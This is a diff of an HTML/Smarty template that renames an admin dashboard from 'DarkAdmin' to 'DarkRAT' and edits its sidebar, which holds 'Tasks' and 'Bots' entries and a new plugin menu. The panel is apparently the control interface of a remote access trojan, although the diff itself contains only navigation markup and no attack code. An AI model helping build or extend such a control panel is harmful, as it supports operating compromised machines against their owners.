@@ -3,8 +3,8 @@
         <div class="container-fluid d-flex align-items-center justify-content-between">
             <div class="navbar-header">
                 <!-- Navbar Header--><a href="/dashboard" class="navbar-brand">
-                    <div class="brand-text brand-big visible text-uppercase"><strong class="text-primary">Dark</strong><strong>Admin</strong></div>
-                    <div class="brand-text brand-sm"><strong class="text-primary">D</strong><strong>A</strong></div></a>
+                    <div class="brand-text brand-big visible text-uppercase"><strong class="text-primary">Dark</strong><strong>RAT</strong></div>
+                    <div class="brand-text brand-sm">D<strong>R</strong></div></a>
                 <!-- Sidebar Toggle Btn-->
                 <button class="sidebar-toggle"><i class="fa fa-long-arrow-left"></i></button>
             </div>
@@ -21,6 +21,7 @@
         </div>
     </nav>
 </header>
+
 <div class="d-flex align-items-stretch">
     <!-- Sidebar Navigation-->
     <nav id="sidebar">
@@ -28,8 +29,8 @@
         <!-- Sidebar Navidation Menus--><span class="heading">Main</span>
         <ul class="list-unstyled">
             <li class=""><a href="/dashboard"> <i class="icon-home"></i>Home </a></li>
-            <li class=""><a href="/tasks"> <i class="icon-computer"></i>Tasks </a></li>
-            <li class=""><a href="/bots"> <i class="icon-list"></i>Bots </a></li>
+            <li class=""><a href="/tasks"> <i class="icon-list"></i>Tasks </a></li>
+            <li class=""><a href="/bots"> <i class="icon-computer"></i>Bots </a></li>
             <li class=""><a href="/settings"> <i class="icon-settings"></i>Settings </a></li>
 <!--
             <li><a href="#exampledropdownDropdown" aria-expanded="false" data-toggle="collapse"> <i class="icon-windows"></i>Example dropdown </a>
@@ -41,6 +42,17 @@
             </li>
 -->
         </ul>
+        <div>
+
+        </div>
+        <!-- Sidebar Navidation Menus--><span class="heading">Plugins</span>
+        <div class="plugin_registrations">
+            <ul class="list-unstyled">
+                {foreach from=$navRegistrations key=name item=navTab}
+                    <li class=""><a href="/{$name}"> <i class="fa fa-cube"></i> {$name} </a></li>
+                {/foreach}
+            </ul>
+        </div>
         <!--
         <span class="heading">Extras</span>
         <ul class="list-unstyled">
@@ -52,3 +64,4 @@
     </nav>
     <!-- Sidebar Navigation end-->
     <div class="page-content">
+
